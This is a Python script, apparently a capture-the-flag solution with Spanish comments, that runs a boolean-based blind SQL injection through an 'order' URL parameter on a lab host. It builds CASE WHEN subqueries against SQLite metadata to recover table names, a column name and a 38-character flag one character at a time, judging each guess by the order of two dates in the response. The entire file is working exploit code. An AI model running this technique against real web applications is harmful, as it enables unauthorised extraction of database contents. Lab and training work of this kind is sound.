import requests

def table_name(n_table,url_web):

	print("\n[+]TABLA {} ---> ".format(n_table+1),end='',flush=True)

	if n_table ==0:
		length_tablas = 5 #numero de caracteres que tiene la tabla
	elif n_table ==1:
		length_tablas = 4

	for x in range(length_tablas): 

		with open('diccionario','r') as dic:

			for caracter in dic:

				letra = caracter.strip()
				payload = {'order':'Case When (select substr(tbl_name,{},1) from sqlite_master where type=''\'table\' limit 1 offset {})=''\'{}\' ''THEN title ELSE date END'.format(x+1,n_table,letra)}

				r = requests.get(url_web,params=payload)

				#comprobamos la posicion(index) en la que se encuntran las dos fechas en la respuesta
				index = r.text.find("2023-08-01")
				index1 = r.text.find("2023-08-02")

				#comparamos para saber si esta ordenando por title o fecha, de este modo sabemo si la comparativa se cumple o no y si es el caracter correcto.
				if index > index1:
					#print (letra,end="",flush=True)
					print ('?',end="",flush=True)
					break

def column_name(url_web):

	print("\n\t[+]Columnas ---> ",end='',flush=True)

	for x in range(4): 

		with open('diccionario','r') as dic:

			for caracter in dic:

				letra = caracter.strip()
				payload = {'order':'Case When (select substr(name,{},1) from pragma_table_info(\'flag\'))=''\'{}\' ''THEN title ELSE date END'.format(x+1,letra)}

				r = requests.get(url_web,params=payload)

				#comprobamos la posicion(index) en la que se encuntran las dos fechas en la respuesta
				index = r.text.find("2023-08-01")
				index1 = r.text.find("2023-08-02")

				#comparamos para saber si esta ordenando por title o fecha, de este modo sabemo si la comparativa se cumple o no y si es el caracter correcto.
				if index > index1:
					#print (letra,end="",flush=True)
					print ('?',end="",flush=True)

					break

def obtenemos_flag(url_web):

	print("\n\t\t[+]Flag ---> ",end='',flush=True)

	for x in range(38): 

		with open('diccionario','r') as dic:

			for caracter in dic:

				letra = caracter.strip()
				payload = {'order':'Case When (select substr(flag,{},1) from flag)=''\'{}\' ''THEN title ELSE date END'.format(x+1,letra)}

				r = requests.get(url_web,params=payload)

				#comprobamos la posicion(index) en la que se encuntran las dos fechas en la respuesta
				index = r.text.find("2023-08-01")
				index1 = r.text.find("2023-08-02")

				#comparamos para saber si esta ordenando por title o fecha, de este modo sabemo si la comparativa se cumple o no y si es el caracter correcto.
				if index > index1:
					print (letra,end="",flush=True)
					break

def main():

	url_web='http://10.10.227.33'

	#Anteriormente hemos conseguido averiguar que hay dos tablas en la bd y que la longitud de sus nombres son de 5 y 4 caracteres.
	for n_table in range(2):
		table_name(n_table,url_web)

	#Nos interesa la tabla flag,sabemos que el nombre de la columna se compone de 4 caracteres.
	column_name(url_web)

	#sabemos el nombre de la tabla, columna,numero de registros(1) y por ultimo el numero de caracteres del resgistro 38.
	#por lo que solo nos queda obtener los caracteres.
	obtenemos_flag(url_web)

if __name__=='__main__':
	main()
